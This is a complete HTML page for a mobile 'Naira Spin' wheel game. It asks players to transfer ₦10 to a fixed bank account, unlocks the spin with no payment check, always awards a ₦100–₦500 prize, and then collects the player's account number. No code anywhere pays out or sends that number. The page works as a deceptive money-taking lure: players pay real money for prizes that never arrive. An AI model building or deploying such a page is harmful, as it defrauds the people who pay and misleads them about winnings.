<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Naira Spin</title>
<style>
  :root{
    --bg:#0f3d2e; --bg2:#0a2a20; --ink:#fdf6e3; --gold:#f5b700; --red:#e63946;
    --card:#14503c; --line:#2a7a5c;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{
    font-family:Georgia,"Times New Roman",serif;
    background:radial-gradient(circle at 50% 0%,var(--bg) 0%,var(--bg2) 70%);
    color:var(--ink); min-height:100vh; padding:20px 16px 40px;
    display:flex; flex-direction:column; align-items:center;
  }
  h1{font-size:2rem;letter-spacing:.5px;margin-bottom:4px;text-align:center}
  .sub{opacity:.8;margin-bottom:18px;text-align:center;font-size:.95rem}
  .panel{
    width:100%;max-width:420px;background:var(--card);border:2px solid var(--line);
    border-radius:14px;padding:18px;margin-bottom:16px;text-align:center;
  }
  .panel h2{font-size:1.15rem;margin-bottom:8px}
  .acct{
    font-family:"Courier New",monospace;font-size:1.8rem;font-weight:bold;
    color:var(--gold);letter-spacing:2px;margin:8px 0;user-select:all;
  }
  .note{font-size:.85rem;opacity:.85;line-height:1.4;margin-top:6px}
  button{
    font-family:inherit;font-size:1.05rem;font-weight:bold;cursor:pointer;
    border:none;border-radius:10px;padding:13px 22px;margin-top:12px;
    background:var(--gold);color:#1b1b1b;width:100%;
  }
  button.alt{background:transparent;color:var(--ink);border:2px solid var(--gold)}
  button:disabled{opacity:.45;cursor:not-allowed}
  button:focus-visible,input:focus-visible{outline:3px solid #fff;outline-offset:2px}
  input{
    width:100%;padding:13px;border-radius:10px;border:2px solid var(--line);
    font-size:1.05rem;margin-top:10px;background:#fff;color:#111;text-align:center;
    font-family:"Courier New",monospace;
  }
  .hidden{display:none}
  .wheel-wrap{position:relative;width:min(88vw,340px);aspect-ratio:1;margin:6px auto 4px}
  #wheel{width:100%;height:100%;display:block;border-radius:50%;
    box-shadow:0 0 0 8px var(--gold),0 12px 30px rgba(0,0,0,.5)}
  .pointer{
    position:absolute;top:-14px;left:50%;transform:translateX(-50%);z-index:2;
    width:0;height:0;border-left:15px solid transparent;border-right:15px solid transparent;
    border-top:30px solid var(--red);filter:drop-shadow(0 2px 2px rgba(0,0,0,.5));
  }
  .result{font-size:1.5rem;margin:6px 0;color:var(--gold);font-weight:bold}
  .err{color:#ffb3b3;font-size:.9rem;margin-top:8px;min-height:1.2em}
  .ok{color:#b8ffd9}
</style>
</head>
<body>

<h1>Naira Spin</h1>
<p class="sub">Pay ₦10, spin once, win ₦100 – ₦500</p>

<!-- STEP 1: PAYMENT -->
<section class="panel" id="payStep">
  <h2>Step 1: Pay ₦10 to play</h2>
  <p>Transfer ₦10 to this account number:</p>
  <div class="acct" id="acctNo">8104772515</div>
  <button class="alt" id="copyBtn" type="button">Copy account number</button>
  <p class="note">After you transfer, tap the button below to unlock your spin.</p>
  <button id="paidBtn" type="button">I have paid ₦10</button>
</section>

<!-- STEP 2: WHEEL -->
<section class="panel hidden" id="gameStep">
  <h2>Step 2: Spin the wheel</h2>
  <div class="wheel-wrap">
    <div class="pointer"></div>
    <canvas id="wheel" width="680" height="680"></canvas>
  </div>
  <button id="spinBtn" type="button">SPIN</button>
</section>

<!-- STEP 3: RESULT + ACCOUNT NUMBER -->
<section class="panel hidden" id="resultStep">
  <h2>You won</h2>
  <div class="result" id="prizeText">₦0</div>
  <p class="note">Enter your account number to receive your prize.</p>
  <input id="userAcct" type="text" inputmode="numeric" maxlength="10" placeholder="10-digit account number" autocomplete="off">
  <div class="err" id="err"></div>
  <button id="submitBtn" type="button">Submit account number</button>
</section>

<!-- DONE -->
<section class="panel hidden" id="doneStep">
  <h2 class="ok">Submitted</h2>
  <p id="doneMsg"></p>
  <button id="againBtn" type="button">Play again (pay ₦10)</button>
</section>

<script>
(function(){
  var PRIZES=[100,200,150,250,500];
  var COLORS=["#e63946","#f5b700","#2a9d8f","#7b2cbf","#f77f00"];
  var canvas=document.getElementById("wheel");
  var ctx=canvas.getContext("2d");
  var size=canvas.width, cx=size/2, cy=size/2, r=size/2-6;
  var n=PRIZES.length, arc=2*Math.PI/n;
  var angle=0, spinning=false, hasPaid=false, won=0;

  function $(id){return document.getElementById(id)}
  function show(id){$(id).classList.remove("hidden")}
  function hide(id){$(id).classList.add("hidden")}

  function drawWheel(){
    ctx.clearRect(0,0,size,size);
    for(var i=0;i<n;i++){
      var a0=angle+i*arc, a1=a0+arc;
      ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,r,a0,a1);ctx.closePath();
      ctx.fillStyle=COLORS[i%COLORS.length];ctx.fill();
      ctx.lineWidth=4;ctx.strokeStyle="#fdf6e3";ctx.stroke();
      ctx.save();
      ctx.translate(cx,cy);ctx.rotate(a0+arc/2);
      ctx.textAlign="right";ctx.fillStyle="#fff";
      ctx.font="bold 54px Georgia, serif";
      ctx.shadowColor="rgba(0,0,0,.45)";ctx.shadowBlur=6;
      ctx.fillText("₦"+PRIZES[i],r-30,18);
      ctx.restore();
    }
    ctx.beginPath();ctx.arc(cx,cy,34,0,2*Math.PI);
    ctx.fillStyle="#fdf6e3";ctx.fill();
    ctx.lineWidth=6;ctx.strokeStyle="#f5b700";ctx.stroke();
  }
  drawWheel();

  $("copyBtn").addEventListener("click",function(){
    var t="8104772515";
    function done(){
      $("copyBtn").textContent="Copied";
      setTimeout(function(){$("copyBtn").textContent="Copy account number"},1500);
    }
    if(navigator.clipboard&&navigator.clipboard.writeText){
      navigator.clipboard.writeText(t).then(done,function(){});
    }else{
      var ta=document.createElement("textarea");ta.value=t;document.body.appendChild(ta);
      ta.select();try{document.execCommand("copy");done()}catch(e){}
      document.body.removeChild(ta);
    }
  });

  $("paidBtn").addEventListener("click",function(){
    hasPaid=true;
    hide("payStep");show("gameStep");
    $("spinBtn").disabled=false;
  });

  $("spinBtn").addEventListener("click",function(){
    if(!hasPaid||spinning)return;
    spinning=true;hasPaid=false; // one payment = one spin
    $("spinBtn").disabled=true;

    // fair, uniformly random result
    var idx=Math.floor(Math.random()*n);
    // pointer is at top (-90deg). Segment idx centre must land there.
    var target=-Math.PI/2-(idx*arc+arc/2);
    var extra=(5+Math.floor(Math.random()*3))*2*Math.PI;
    var start=angle;
    var cur=((start%(2*Math.PI))+2*Math.PI)%(2*Math.PI);
    var tgt=((target%(2*Math.PI))+2*Math.PI)%(2*Math.PI);
    var delta=tgt-cur; if(delta<0)delta+=2*Math.PI;
    var total=extra+delta;
    var dur=5000,t0=null;

    function ease(t){return 1-Math.pow(1-t,4)}
    function frame(ts){
      if(!t0)t0=ts;
      var p=Math.min((ts-t0)/dur,1);
      angle=start+total*ease(p);
      drawWheel();
      if(p<1){requestAnimationFrame(frame)}
      else{
        spinning=false;won=PRIZES[idx];
        $("prizeText").textContent="₦"+won;
        hide("gameStep");show("resultStep");
      }
    }
    requestAnimationFrame(frame);
  });

  $("submitBtn").addEventListener("click",function(){
    var v=$("userAcct").value.replace(/\s+/g,"");
    if(!/^\d{10}$/.test(v)){
      $("err").textContent="Enter a valid 10-digit account number.";
      return;
    }
    $("err").textContent="";
    $("doneMsg").textContent="You won ₦"+won+". Account number "+v+" has been submitted.";
    hide("resultStep");show("doneStep");
  });

  $("againBtn").addEventListener("click",function(){
    won=0;$("userAcct").value="";
    hide("doneStep");show("payStep");
  });
})();
</script>
</body>
</html>
